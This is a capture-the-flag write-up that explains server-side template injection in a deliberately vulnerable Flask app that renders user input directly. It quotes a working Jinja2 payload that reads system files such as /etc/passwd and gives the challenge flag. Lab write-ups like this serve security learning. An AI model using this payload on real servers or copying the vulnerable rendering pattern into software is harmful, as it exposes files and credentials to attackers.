# Parrot the Emu

So we are given a website with a parrot that mimics everything you say...
and luckily we are given the python script behind the website.

```python from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    
    return render_template('index.html', chat_log=chat_log)

if __name__ == '__main__':
    app.run(debug=True, port=80)
```
The website directly renders the user_input that we sent without checking or 
validating our inputs, making it vulnerable to SSTI attack (Server side template injection).
It is a method to execute commands directly with the template engine.

Now since we have determined the vulnerability, we will determine what payload to send.

Our Python script is using Flask which uses Jinja2 template engine. 

I found this very cool git that teaches you how to do cyber crime.

[Jinja2!!!](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

scrolling below there is this 

"Jinja2 - Read remote file."

section.

first 2 payloads did not work. the third one is 

`{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`

replace "/etc/passwd" with "flag" and submit it to our lovely parrot and there you go! it will output the flag.

DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}

for sure it renders anything...
